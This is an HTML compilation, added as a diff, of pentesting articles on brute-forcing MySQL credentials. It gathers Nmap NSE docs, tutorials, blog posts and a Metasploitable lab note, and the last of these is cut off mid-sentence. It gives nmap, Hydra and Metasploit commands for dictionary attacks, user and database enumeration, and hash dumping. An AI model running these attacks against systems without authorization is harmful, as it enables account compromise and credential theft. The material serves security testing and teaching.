@@ -1,0 +1,2979 @@
+<html class="gr__0_0_0_0"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="mysql-brute_files/bootstrap.css" rel="stylesheet">
+</head><body ng-class="{
+    'cover-background': currentPage === 'login' ||
+        currentPage === 'create-account' ||
+        currentPage === 'password-reset',
+    'checkout': currentPage === 'checkout',
+    'has-footer': currentPage !== 'login' &amp;&amp;
+        currentPage !== 'create-account' &amp;&amp;
+        currentPage !== 'password-reset' &amp;&amp;
+        currentPage !== 'product',
+    'has-bottom-pagination': currentPage === 'saved' ||
+        currentPage === 'bookmarks' ||
+        currentPage === 'purchases' ||
+        currentPage === 'history',
+    
+    'sidebar-open': showSideBarOverlay,
+    'home-body': currentPage != 'create-account' || !freeWeekend,
+    'free-weekend': currentPage === 'create-account' &amp;&amp; freeWeekend,
+     }" id="readabilityBody" class="" data-gr-c-s-loaded="true">
+<div class="container">
+
+    <hr>
+
+    <h2> <strong> Title: mysql-brute NSE Script </strong></h2>
+
+    <p>Content courtesy of:
+      https://nmap.org/nsedoc/scripts/mysql-brute.html
+
+
+  
+    </p><div>
+      <div id="content">
+        <h1>File <code>mysql-brute</code></h1>
+
+        <p> <a href="https://nmap.org/book/nse-script-format.html#nse-format-rules">Script types</a>: portrule <br>
+          Categories: <i><a href="http://0.0.0.0:5000/categories/intrusive.html">intrusive</a></i>, <i><a href="http://0.0.0.0:5000/categories/brute.html">brute</a></i> <br>
+          Download: <a href="https://svn.nmap.org/nmap/scripts/mysql-brute.nse">https://svn.nmap.org/nmap/scripts/mysql-brute.nse</a>
+
+        </p><h2> User Summary</h2>
+
+        <p> Performs password guessing against MySQL.
+
+        </p><h3>See also:</h3>
+
+        <h2> Script Arguments</h2>
+
+        <p>
+
+        </p><h4> mysql-brute.timeout</h4>
+
+        <p> socket timeout for connecting to MySQL (default 5s)
+
+        </p><h4> passdb, unpwdb.passlimit, unpwdb.timelimit,
+          unpwdb.userlimit, userdb</h4>
+
+        <p> See the documentation for the</p>
+        <a href="http://0.0.0.0:5000/lib/unpwdb.html#script-args">unpwdb</a>
+        <p> library.
+
+        </p><h4> creds.[service], creds.global</h4>
+
+        <p> See the documentation for the</p>
+        <a href="http://0.0.0.0:5000/lib/creds.html#script-args">creds</a>
+        <p> library.
+
+        </p><h4> brute.credfile, brute.delay, brute.emptypass,
+          brute.firstonly, brute.guesses, brute.mode, brute.passonly,
+          brute.retries, brute.start, brute.threads, brute.unique,
+          brute.useraspass</h4>
+
+        <p> See the documentation for the</p>
+        <a href="http://0.0.0.0:5000/lib/brute.html#script-args">brute</a>
+        <p> library.
+
+        </p><h2> Example Usage</h2>
+
+        <p>
+
+        </p><pre>nmap --script=mysql-brute &lt;target&gt;
+</pre>
+
+        <h2> Script Output</h2>
+
+        <pre>3306/tcp open  mysql
+| mysql-brute:
+|   Accounts
+|     root:root - Valid credentials
+</pre>
+
+        <h2> Requires</h2>
+
+        <hr>
+
+        <p><b>Author:</b>
+
+        </p><p><b>License: </b> Same as Nmap--See <a href="https://nmap.org/book/man-legal.html">https://nmap.org/book/man-legal.html</a>
+      </p></div>
+    </div>
+
+
+  
+    <hr>
+
+    <h2> <strong> Title: MySQL Penetration Testing with Nmap </strong></h2>
+
+    <p>Content courtesy of:
+      https://www.hackingarticles.in/mysql-penetration-testing-nmap/
+
+
+  
+    </p><div>
+      <div class="entry-content clearfix">
+        <p><span>In this article, we are discussing MYSQL penetration
+          testing using Nmap where you will learn how to retrieve
+          database information such as database name, table’s records,
+          username, password and etc.</span>
+
+        </p><p><span><strong>MySQL </strong>is an open Source for
+          <strong>R</strong>elational <strong>D</strong>atabase
+          Management <strong>S</strong>ystem that uses structured
+          query language for generating database record. &nbsp;</span>
+
+        </p><p><span><strong>Let’s Begin !!!</strong></span>
+
+        </p><p><span><strong>Scanning for port 3306</strong></span>
+
+        </p><p><span><strong>&nbsp;</strong>open the terminal and type
+          following command to check MySQL service is activated on the
+          targeted system or not, basically MySQL service is activated
+          on default port 3306.</span></p>
+           
+        <p><span>From the given image you can observe <strong>port
+          3306</strong> is <strong>open</strong> for MySQL service,
+          now let’s enumerate it.</span>
+
+        </p><p><span><img data-recalc-dims="1" src="mysql-brute_files/1.png"></span>
+
+        </p><h3><span><strong>Retrieve MySQL information</strong></span></h3>
+
+        <p><span>Now type another command to retrieve MySQL
+          information such as version, protocol and etc:</span></p>
+         
+        <div class="crayon-syntax crayon-theme-familiar crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa7645101e589885947">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa7645101e589885947-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-v">script</span><span class="crayon-o">=</span><span class="crayon-v">mysql</span><span class="crayon-o">-</span><span class="crayon-i">info</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.1.216</span>
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p><span>Above command try to connect to with MySQL server
+          and hence prints information such as the <strong>protocol</strong>: 10, <strong>version</strong> numbers:
+          5.5.57 -0 ubuntu0.14.04.1, <strong>thread ID</strong>: 159,
+          <strong>status</strong>: auto-commit, <strong>capabilities</strong>, and the <strong>password
+          salt</strong> as shown in given below image.</span>
+
+        </p><p><span><img data-recalc-dims="1" src="mysql-brute_files/2.png"></span>
+
+        </p><h3><span><strong>Brute force attack</strong></span></h3>
+
+        <p><span>This command will use the dictionary for username
+          and password and then try to match the username and password
+          combination by making brute force attack against mysql.</span></p>
+         
+        <div class="crayon-syntax crayon-theme-familiar crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76451021411202349">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76451021411202349-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-v">p3306</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-v">script</span><span class="crayon-o">=</span><span class="crayon-v">mysql</span><span class="crayon-o">-</span><span class="crayon-v">brute</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-v">script</span><span class="crayon-o">-</span><span class="crayon-e">args </span><span class="crayon-v">userdb</span><span class="crayon-o">=</span><span class="crayon-o">/</span><span class="crayon-v">root</span><span class="crayon-o">/</span><span class="crayon-v">Desktop</span><span class="crayon-o">/</span><span class="crayon-v">user</span><span class="crayon-sy">.</span><span class="crayon-v">txt</span><span class="crayon-sy">,</span><span class="crayon-v">passdb</span><span class="crayon-o">=</span><span class="crayon-o">/</span><span class="crayon-v">root</span><span class="crayon-o">/</span><span class="crayon-v">Desktop</span><span class="crayon-o">/</span><span class="crayon-v">pass</span><span class="crayon-sy">.</span><span class="crayon-i">txt</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.1.216</span>
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p><span><strong>&nbsp;</strong>From the given image you can
+          observe that it found the valid credential <strong>root:
+          toor</strong>. This credential will help indirectly login
+          into MYSQL server.</span>
+
+        </p><p><span><img data-recalc-dims="1" src="mysql-brute_files/3.png"></span>
+
+        </p><h3><span><strong>Retrieve MySQL usernames</strong></span></h3>
+
+        <p><span>This command will fetch MySQL users name which helps
+          of given argument MySQL user <strong>root</strong> and
+          mysqlpass <strong>toor</strong>.</span></p>
+         
+        <div class="crayon-syntax crayon-theme-familiar crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76451024182562147">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76451024182562147-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">p3306</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.1.216</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-v">script</span><span class="crayon-o">=</span><span class="crayon-v">mysql</span><span class="crayon-o">-</span><span class="crayon-v">users</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-v">script</span><span class="crayon-o">-</span><span class="crayon-e">args </span><span class="crayon-v">mysqluser</span><span class="crayon-o">=</span><span class="crayon-v">root</span><span class="crayon-sy">,</span><span class="crayon-v">mysqlpass</span><span class="crayon-o">=</span><span class="crayon-v">toor</span>
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p><span>From given below image you can see we had found four
+          usernames: root, Debian-sys-maint, sr, st.</span>
+
+        </p><p><span><img data-recalc-dims="1" src="mysql-brute_files/4_003.png"></span>
+
+        </p><h3><span><strong>Retrieve database names</strong></span></h3>
+
+        <p><span>This command will fetch MySQL database name which
+          helps of given argument mysqluser <strong>root</strong> and
+          mysqlpass <strong>toor</strong>.</span></p>
+         
+        <div class="crayon-syntax crayon-theme-familiar crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76451026310878987">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76451026310878987-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">p3306</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.1.216</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-v">script</span><span class="crayon-o">=</span><span class="crayon-v">mysql</span><span class="crayon-o">-</span><span class="crayon-v">databases</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-v">script</span><span class="crayon-o">-</span><span class="crayon-e">args </span><span class="crayon-v">mysqluser</span><span class="crayon-o">=</span><span class="crayon-v">root</span><span class="crayon-sy">,</span><span class="crayon-v">mysqlpass</span><span class="crayon-o">=</span><span class="crayon-v">toor</span>
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p><span><strong>&nbsp;</strong>From given below image you can
+          read the name of created database such as ignite</span>
+
+        </p><p><span><img data-recalc-dims="1" src="mysql-brute_files/4.png"></span>
+
+        </p><p><span>This command will also perform the same task as
+          above but retrieve database name using MySQL query “show
+          database”</span></p>
+         
+        <div class="crayon-syntax crayon-theme-familiar crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa7645102c030066570">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa7645102c030066570-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">p</span><span class="crayon-h"> </span><span class="crayon-cn">3306</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.1.216</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-v">script</span><span class="crayon-o">=</span><span class="crayon-v">mysql</span><span class="crayon-o">-</span><span class="crayon-v">query</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-v">script</span><span class="crayon-o">-</span><span class="crayon-i">args</span><span class="crayon-h"> </span><span class="crayon-s">"query=show
+                        databases,username=root,password=toor"</span>
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p><span><strong>&nbsp;</strong>From given below image you can
+          read the name of created database such as ignite</span>
+
+        </p><p><span><img data-recalc-dims="1" src="mysql-brute_files/4_002.png"></span>
+
+        </p><h3><span><strong>Retrieve MySQL variable status ON/OFF
+          </strong></span></h3>
+
+        <p><span>When we want to pass a value from one SQL statement
+          to another SQL statement, then we store the value in a MySQL
+          user-defined variable.</span>
+
+        </p><p><span>This command will fetch MySQL variables name which
+          help of given argument mysqluser <strong>root</strong> and
+          mysqlpass <strong>toor</strong>.</span></p>
+         
+        <div class="crayon-syntax crayon-theme-familiar crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa7645102e072358205">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa7645102e072358205-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">p3306</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.1.216</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-v">script</span><span class="crayon-o">=</span><span class="crayon-v">mysql</span><span class="crayon-o">-</span><span class="crayon-v">variables</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-v">script</span><span class="crayon-o">-</span><span class="crayon-e">args </span><span class="crayon-v">mysqluser</span><span class="crayon-o">=</span><span class="crayon-v">root</span><span class="crayon-sy">,</span><span class="crayon-v">mysqlpass</span><span class="crayon-o">=</span><span class="crayon-v">toor</span>
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p><span>From the given image you can observe ON/OFF status
+          for MySQL variable.</span>
+
+        </p><p><span><img data-recalc-dims="1" src="mysql-brute_files/6.png"></span>
+
+        </p><h3><span><strong>Retrieve Hash Dump</strong></span></h3>
+
+        <p><span>This command will Dumps the password hashes from a
+          MySQL server in a format suitable for cracking by tools such
+          as John the Ripper.</span></p>
+         
+        <div class="crayon-syntax crayon-theme-familiar crayon-font-monaco crayon-os-mac print-yes notranslate" data-settings=" minimize scroll-mouseover" id="crayon-5d6aa76451030639569326">  
+          <p class="crayon-info">
+
+          </p><p class="crayon-plain-wrap">
+
+          </p><div class="crayon-main">
+            <table class="crayon-table"></table>
+
+            <p>
+
+            <table>
+              <tbody>
+                <tr class="crayon-row">
+            </tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-nums " data-settings="show">
+                    
+            </td></tr></tbody></table>
+
+            </p><p>
+
+            <table>
+              <tbody>
+                <tr>
+                  <td class="crayon-code">
+                    <div class="crayon-pre">
+                      <p class="crayon-line" id="crayon-5d6aa76451030639569326-1"><span class="crayon-v">nmap</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">p3306</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.1.216</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-v">script</span><span class="crayon-o">=</span><span class="crayon-v">mysql</span><span class="crayon-o">-</span><span class="crayon-v">dump</span><span class="crayon-o">-</span><span class="crayon-v">hashes</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-v">script</span><span class="crayon-o">-</span><span class="crayon-e">args </span><span class="crayon-v">username</span><span class="crayon-o">=</span><span class="crayon-v">root</span><span class="crayon-sy">,</span><span class="crayon-v">password</span><span class="crayon-o">=</span><span class="crayon-v">toor</span>
+                    </p></div>
+            </td></tr></tbody></table>
+
+            </p><p>  
+          </p></div>
+          </div>
+         
+        <p><span>From the given image you can observe that it has
+          dumped the hash value of passwords of the respective user
+          which we have enumerated above.</span>
+
+        </p><p><span><img data-recalc-dims="1" src="mysql-brute_files/8.png"></span>
+
+        </p><p><span><strong>Author</strong>: Sanjeet Kumar is an
+          Information Security Analyst | Pentester | Researcher
+          &nbsp;Contact&nbsp;<a href="https://www.linkedin.com/in/sanjeet-kumar-27828058/"><strong>Here</strong></a></span>
+
+        </p><div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded" data-name="like-post-frame-45195231-13499-5d6aa764605e6" data-src="https://widgets.wp.com/likes/#blog_id=45195231&amp;post_id=13499&amp;origin=www.hackingarticles.in&amp;obj_id=45195231-13499-5d6aa764605e6" id="like-post-wrapper-45195231-13499-5d6aa764605e6">
+          <h3 class="sd-title">Like this:</h3>
+
+          <p class="likes-widget-placeholder post-likes-widget-placeholder"><span class="button"><span>Like</span></span> <span class="loading">Loading...</span></p>
+          <span class="sd-text-color"><a class="sd-link-color"></a></span></div>
+      </div>
+    </div>
+
+
+  
+    <hr>
+
+    <h2> <strong> Title: Packt Subscription | More Tech, More Choice,
+      More Value </strong></h2>
+
+    <p>Content courtesy of:
+      https://subscription.packtpub.com/book/networking_and_servers/9781849517485/5/ch05lvl1sec66/brute-forcing-mysql-passwords
+
+  <noscript> <main-nav> <sidebar-overlay show=showSideBarOverlay>
+    <error-dialog> <subs-footer> </subs-footer></error-dialog
+    ></sidebar-overlay></main-nav></noscript>
+
+  
+    </p><hr>
+
+    <h2> <strong> Title: Packt Subscription | More Tech, More Choice,
+      More Value </strong></h2>
+
+    <p>Content courtesy of:
+      https://subscription.packtpub.com/book/networking_and_servers/9781786467454/5/ch05lvl1sec72/brute-forcing-mysql-passwords
+
+  <noscript> <main-nav> <sidebar-overlay show=showSideBarOverlay>
+    <error-dialog> <subs-footer> </subs-footer></error-dialog
+    ></sidebar-overlay></main-nav></noscript>
+
+  
+    </p><hr>
+
+    <h2> <strong> Title: Robert Penz Blog " How to brute force a
+      MySQL DB </strong></h2>
+
+    <p>Content courtesy of:
+      https://robert.penz.name/1416/how-to-brute-force-a-mysql-db/
+
+
+  
+    </p><div>
+      <div id="post">
+        <p class="date">December 29, 2016
+
+        </p><p>There are many articles on how to use Metasploit or some
+          other mighty stuff that is fine if you work with it all day.
+          But if you just found a MySQL server on an appliance
+          listening in your network and need to do a fast small
+          security check there is something easier. First find the
+          MySQL server and check the version – maybe there is a exploit
+          available and you don’t need to try passwords. The first
+          choice for this is nmap, just install it with <code> sudo
+          apt-get install nmap</code> and call it like this:
+
+        </p><p><code># nmap -sV -O &lt;IP&gt;</code>
+
+        </p><p><code>Starting Nmap 7.01 ( https://nmap.org ) at
+          2016-xx-xx xx:xx CET<br>
+          Nmap scan report for hostname (&lt;IP&gt;)<br>
+          Host is up (0.020s latency).<br>
+          Not shown: 986 closed ports<br>
+          PORT STATE SERVICE VERSION<br>
+          ....<br>
+          3306/tcp open mysql MySQL 5.6.33-79.0-log<br>
+          ....<br>
+          Device type: general purpose<br>
+          Running: Linux 3.X|4.X<br>
+          OS CPE: cpe:/o:linux:linux_kernel:3
+          cpe:/o:linux:linux_kernel:4<br>
+          OS details: Linux 3.2 - 4.0<br>
+          Network Distance: x hops</code>
+
+        </p><p>You need to call it as root with these options. The -sV
+          shows the versions of the listening services and -O guesses
+          the operating system.&nbsp; For brute forcing we need 3 things
+
+        </p><ul>
+          <li>a list of usernames to try
+
+          </li><li>a list of passwords to try
+
+          </li><li>a software that does the trying
+        </li></ul>
+
+        <p>The first is for one thing quite easy as the default users
+          are known and you maybe know something about the system ..
+          like software name or vendor name or the online download-able
+          manual shows the username. So lets write the file:
+
+        </p><p><code>$ cat &gt; usernames.txt<br>
+          admin<br>
+          root<br>
+          mysql<br>
+          db<br>
+          test<br>
+          user</code>
+
+        </p><p>Now we need a list of likely passwords .. sure we could
+          think about some by our own, but it is easier to download
+          them. A good source is <a href="https://wiki.skullsecurity.org/Passwords" target="_blank">Skull Security</a>. Choose your list and
+          download it and extract it with <code>bunzip2
+          xxxxx.txt.bz2</code>. Now we only need the software … we’ll
+          use <a href="https://www.thc.org/thc-hydra/" target="_blank">THC Hydra</a>, but you don’t need to download it there and
+          compile it, as Ubuntu ships with it. Just type <code>sudo
+          apt-get install hydra</code>. Now we just need to call it.
+
+        </p><p><code>$ hydra -L usernames.txt -P xxxxx.txt &lt;ip&gt;
+          mysql<br>
+          Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in
+          military or secret service organizations, or for illegal
+          purposes.<br>
+          Hydra (http://www.thc.org/thc-hydra) starting at 2016-12-29
+          14:19:38<br>
+          [INFO] Reduced number of tasks to 4 (mysql does not like many
+          parallel connections)<br>
+          [DATA] max 4 tasks per 1 server, overall 64 tasks, 86066388
+          login tries (l:6/p:14344398), ~336196 tries per task<br>
+          [DATA] attacking service mysql on port 3306<br>
+          [STATUS] 833.00 tries/min, 833 tries in 00:01h, 86065555 todo
+          in 1721:60h, 4 active<br>
+          .....</code>
+
+        </p><p>I think this password list is too long 😉 Choose a shorter
+          one 😉
+        <rdf xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/"> <description dc:identifier="https://robert.penz.name/1416/how-to-brute-force-a-mysql-db/" dc:title="How to brute force a MySQL DB" rdf:about="https://robert.penz.name/1416/how-to-brute-force-a-mysql-db/" trackback:ping="https://robert.penz.name/1416/how-to-brute-force-a-mysql-db/trackback/"> </description></rdf>
+        </p><p><a href="https://robert.penz.name/1416/how-to-brute-force-a-mysql-db/feed/"><abbr title="Really Simple Syndication">RSS</abbr> feed
+          for comments on this post.</a> <a href="https://robert.penz.name/1416/how-to-brute-force-a-mysql-db/trackback/" rel="trackback">TrackBack <abbr title="Uniform Resource Identifier">URI</abbr></a>
+      </p></div>
+    </div>
+
+
+  
+    <hr>
+
+    <h2> <strong> Title: " Blog Archive " Brute force MySQL with Nmap
+      </strong></h2>
+
+    <p>Content courtesy of:
+      http://travisaltman.com/brute-force-mysql-with-nmap/
+
+
+  
+    </p><div>
+      <div class="post" id="post-840">
+        <h2>Brute force MySQL with Nmap</h2>
+
+        <div class="entry">
+          <p>Just a quick one liner, you can also incorporate this
+            into a huge sweep of the network which will hopefully
+            identify MySQL databases with weak or default credentials.
+
+          </p><div class="codecolorer-container text blackboard">
+            <p class="text codecolorer">nmap -p 3306 10.10.10.10
+              --script mysql-brute --script-args
+              userdb=user.txt,passdb=pass.txt
+          </p></div>
+
+          <p class="postmetadata alt"> <small> This entry was posted
+            on Wednesday, December 24th, 2014 at 3:14 am and is filed
+            under <a href="http://travisaltman.com/category/uncategorized/" rel="category tag">Uncategorized</a>. You can follow any
+            responses to this entry through the <a href="http://travisaltman.com/brute-force-mysql-with-nmap/feed/">RSS 2.0</a> feed. You can skip to the end and leave a
+            response. Pinging is currently not allowed. </small>
+        </p></div>
+      </div>
+    </div>
+
+
+  
+    <hr>
+
+    <h2> <strong> Title: Brute forcing MySQL passwords - Nmap 6:
+      Network Exploration and Security Auditing Cookbook [Book]
+      </strong></h2>
+
+    <p>Content courtesy of:
+      https://www.oreilly.com/library/view/nmap-6-network/9781849517485/ch05s06.html
+
+
+  
+    </p><div>
+      <div id="test-content-id">
+        <div class="section" title="Brute forcing MySQL passwords">
+          <div class="titlepage">
+            <div>
+              <p>
+
+              </p><h1 class="title">Brute forcing MySQL passwords</h1>
+            </div>
+          </div>
+
+          <p>Web servers sometimes return database connection errors
+            that reveal the MySQL username used by the web application.
+            Penetration testers could use this information to perform
+            brute force password auditing.
+
+          </p><p>This recipe describes how to launch dictionary attacks
+            against MySQL servers by using Nmap.
+
+          </p><div class="section" title="How to do it...">
+            <p>To perform brute force password auditing against MySQL
+              servers by using Nmap, use the following command:
+
+            </p><div class="informalexample">
+              <pre class="programlisting"><span class="strong"><strong>$ nmap -p3306 --script mysql-brute &lt;target&gt;</strong></span>
+</pre>
+            </div>
+
+            <p>If valid credentials are found, they will be included
+              in the <code class="literal">mysql-brute</code> output
+              section:
+
+            </p><div class="informalexample">
+              <pre class="programlisting"><span class="strong"><strong>3306/tcp open  mysql</strong></span>
+<span class="strong"><strong>| mysql-brute:  </strong></span>
+<span class="strong"><strong>|   root:&lt;empty&gt; =&gt; Valid credentials</strong></span>
+<span class="strong"><strong>|_  test:test =&gt; Valid credentials</strong></span>
+</pre>
+            </div>
+          </div>
+
+          <div class="section" title="How it works...">
+            <p>The script <code class="literal">mysql-brute</code> was
+              written by Patrik Karlsson ...
+          </p></div>
+        </div>
+      </div>
+    </div>
+
+
+  
+    <hr>
+
+    <h2> <strong> Title: Penetration Testing: Brute Forcing MySQL
+      </strong></h2>
+
+    <p>Content courtesy of:
+      http://pen-testing-lab.blogspot.com/2012/01/brute-forcing.html
+
+
+  
+    </p><div>
+      <div class="post-body entry-content" id="post-body-2419178665421348029">
+        <p> I just did my first nmap scan against the Metasploitable
+          Virtual Machine. There are several open ports and a lot of
+          services running on the VM. Here is a listing of the services
+          found by nmap:</p>
+        <i><br>
+        </i> <i><br>
+        <span> PORT STATE SERVICE VERSION<br>
+        <br>
+        21/tcp open ftp ProFTPD 1.3.1<br>
+        </span></i>
+        <p><i><span>22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1
+          (protocol 2.0)<br>
+          </span></i>
+
+        </p><p><i><span>23/tcp open telnet Linux telnetd<br>
+          25/tcp open smtp Postfix smtpd</span></i>
+
+        </p><p><span><i>53/tcp open domain<br>
+          80/tcp open http Apache httpd 2.2.8 ((Ubuntu)
+          PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)</i><i><br>
+          </i></span>
+
+        </p><p><i><span>139/tcp open netbios-ssn Samba smbd 3.X
+          (workgroup: WORKGROUP)</span></i><i><span><br>
+          445/tcp open netbios-ssn Samba smbd 3.X (workgroup:
+          WORKGROUP)<br>
+          <span>3306/tcp open mysql MySQL 5.0.51a-3ubuntu5</span><br>
+          5432/tcp open postgresql PostgreSQL DB 8.3.0 - 8.3.7<br>
+          8009/tcp open ajp13?<br>
+          8180/tcp open http Apache Tomcat/Coyote JSP engine 1.1</span><br>
+          </i><br>
+          <i><span><br>
+          </span></i>
+
+        </p><div>
+          <p>First I wanted to execute some brute-force attacks
+            against the MySQL database that is running in
+            Metasploitable. There are different ways of brute-forcing
+            it, but your scanner is just as good as you're wordlist or
+            wordcombination files for usernames and passwords are (</p>
+          <a href="http://www.skullsecurity.org/wiki/index.php/Passwords">here</a>
+          <p> are username and password lists for a first shot).
+
+          </p><p> As password list, I'm using elitehacker.txt.bz2 provided
+            by skullsecurity.org and I defined six different users:</p>
+          <span><i>root@bt:~/test_environment/brute_force# cat
+          username.txt&nbsp;</i></span> <span><i>admin</i></span>
+          <span><i>root</i></span> <span><i>mysql</i></span>
+          <span><i>db</i></span> <span><i>test</i></span> <span><i>user</i></span>
+          <p> I inserted also all of these six users and a blank
+            line&nbsp;into the elitehackers.txt password file.
+        </p></div>
+
+        <p><br>
+
+        </p><p>1. Using Metasploit
+
+        </p><p><br>
+
+        </p><p>#msfconsole
+
+        </p><p>#search mysql
+
+        </p><div>
+          <p>#use auxiliary/scanner/mysql/mysql_login
+
+          </p><p> #show options
+
+          </p><p> #set RHOSTS &lt;Target IP&gt;
+
+          </p><p> #set USER_FILE /root/&lt;your_username_file&gt;
+
+          </p><p> #set PASS_FILE /root/&lt;your_password_file&gt;
+
+          </p><p> #exploit
+
+          </p><p> The verbose mode is set by default to true, so you can
+            see all login attempts. This is not very convenient,
+            because of two reasons:
+
+          </p><p> a) If the brute force attempt is successful you have to
+            scroll back the whole list of attempts to find the login as
+            there is no summary after finishing the mysql_login module
